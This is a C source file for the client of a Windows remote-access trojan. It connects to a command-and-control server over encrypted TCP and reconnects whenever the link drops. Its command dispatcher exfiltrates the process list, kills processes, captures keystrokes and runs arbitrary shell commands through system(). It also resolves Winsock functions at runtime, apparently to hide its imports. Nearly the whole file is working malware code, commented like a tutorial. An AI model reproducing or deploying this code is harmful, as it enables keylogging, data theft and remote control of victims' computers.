#include "defines.h"
#include "functions.h"

int exec(SOCKET sock, char *command);
void sendBuffer(SOCKET dst, char *buf, int n);


/*
 * sends a buffer to the C2 server in chunks of NETSIZE bytes
 * 
 * SOCKET dst: an open socket to the C2 server
 * char *buf: the buffer to send
 * int n: the size of the buffer in bytes
 */
void sendBuffer(SOCKET dst, char *buf, int n)
{
    t_send send = (t_send)dllCall("Ws2_32.dll", "send");
    CloseHandle(hDLL);

    // While there are still bytes to send (in packets sized NETSIZE bytes)
    while (n > 0)
    {
        printf("\tSending %i / %i bytes . . .\n", NETSIZE, n);

        // Encrypt NETSIZE bytes and send them
        cipher(buf, NETSIZE);
        send(dst, buf, NETSIZE, 0);

        // Point to the next NETSIZE bytes to send
        buf += NETSIZE;

        n -= NETSIZE;

        Sleep(DELAY * 1000);
    }
    printf("\n");
}

/*
 * interprets a command in the format '# param' and dispatches to the appropriate functions
 * 
 * SOCKET sock: a connected socket to the C2 server
 * char *command: the command to be executed
 * 
 * returns: 1 if successful
 *          0 if unsuccessful
 */
int exec(SOCKET sock, char *command)
{
    // This buffer will store ALL of the data captured by this program, its size dictates the memory footprint
    char *buf = (char *)calloc(MEMSIZE, sizeof(char)); // Use calloc so the server isn't sent garbage

    int cmd = (int)command[0] - 48; // ASCII 0 = 48

    char *param = command + 2; // The command and parameter are delimited by a space

    printf("[!] Command Received: %i %s\n\n", cmd, param);

    if (cmd == 1) // Exfil processes
    {
        getProcesses(buf, MEMSIZE);
        sendBuffer(sock, buf, slen(buf));
        free(buf);
        return 1;
    }
    if (cmd == 2) // Kill a process
    {
        killProcess(param);
        snprintf(buf, slen(param) + 28, "[!] Killed '%s' successfully", param);
        sendBuffer(sock, buf, slen(buf));
        free(buf);
        return 1;
    }
    if (cmd == 3) // Keylog
    {
        int numkeys = ston(param);
        getKeystrokes(buf, numkeys > 0 && numkeys < MEMSIZE ? numkeys : NUMKEYS); // Capture NUMKEYS if no parameter wes given
        sendBuffer(sock, buf, slen(buf));
        free(buf);
        return 1;
    }
    if (cmd == 4) // Execute arbitrary commands
    {
        system(param);
        snprintf(buf, slen(param) + 28, "[!] Executed '%s' successfully", param);
        sendBuffer(sock, buf, slen(buf));
        free(buf);
        return 1;
    }
    return 0;
}

/*
 * opens a socket to the C2 server and sends the client hello message
 * 
 * char *id: a string that identifies this client in the format '[MM/DD/YY HH:MM:SS] USERNAME VERSION (BUILD)'
 * 
 * returns: 1 if successful
 */
void connectServer(char *id)
{
    // All 6 of these procedures are exported by Ws2_32.dll, so we can use the same handle to get their addresses
    t_send send = (t_send)dllCall("Ws2_32.dll", "send");
    t_recv recv = (t_recv)GetProcAddress(hDLL, "recv");
    t_socket socket = (t_socket)GetProcAddress(hDLL, "socket");
    t_connect connect = (t_connect)GetProcAddress(hDLL, "connect");
    t_WSAStartup WSAStartup = (t_WSAStartup)GetProcAddress(hDLL, "WSAStartup");
    t_closesocket closesocket = (t_closesocket)GetProcAddress(hDLL, "closesocket");
    CloseHandle(hDLL);

    // The WSADATA structure contains information about the Windows Sockets implementation. It receives this information from WSAStartup
    WSADATA wsadata; // https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata

    // MAKEAWORD creates a WORD value by concatenating the specified values
    WSAStartup(MAKEWORD(2, 2), &wsadata);


    // This structure is used to specify the C2 servers address and port to connect to
    SOCKADDR_IN addr; // https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in
    addr.sin_family = AF_INET;                // IPv4
    addr.sin_addr.s_addr = inet_addr(RSERVER); // inet_addr converts a string containing an IPv4 dotted-decimal address into a proper address
    addr.sin_port = htons(PORT);              // htons converts a u_short from host to TCP/IP network byte order

    // Create a socket that is bound to an IPv4 TCP stream
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    char recvbuf[NETSIZE] = "";
    char sendbuf[NETSIZE] = "";

    printf("[!] Connecting . . .\n\n");

    while (1)
    {
        // Establish a connection from sock to addr. Must include the length, in bytes, of the sockaddr structure
        if (connect(sock, (SOCKADDR *)&addr, sizeof(addr)) != SOCKET_ERROR)
        {
            printf("[+] Connected! Sending identifier and waiting for command . . .\n\n");
            
            // Cipher and send client ID
            mcpy(sendbuf, id, NETSIZE);
            cipher(sendbuf, NETSIZE);
            send(sock, sendbuf, NETSIZE, 0);

            while (1)
            {
                getTime(id); // Update the timestamp

                mcpy(sendbuf, id, NETSIZE); // Write the updated id to sendbuf
                cipher(sendbuf, NETSIZE);   // Encrypt what is about to be sent
                send(sock, sendbuf, NETSIZE, 0);
                
                printf("--------------------------------------------------------------------------------\n");
                printf("%s\n", id);
                printf("--------------------------------------------------------------------------------\n\n");
                
                if (recv(sock, recvbuf, NETSIZE, 0) < 0) // Server closed the connection
                {
                    printf("[!] Server closed connection. Attempting to reconnect every %is. . .\n\n", TIMEOUT);
                    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Re-establish the socket
                    break;                                            
                }
                
                cipher(recvbuf, NETSIZE); // Decrypt what was received
                exec(sock, recvbuf);      // Send to exec for command interpretation
            }
        }
        printf("[!] Connection failed (sleeping for %is)\n\n", TIMEOUT);
        Sleep(TIMEOUT * 1000);
    }
}
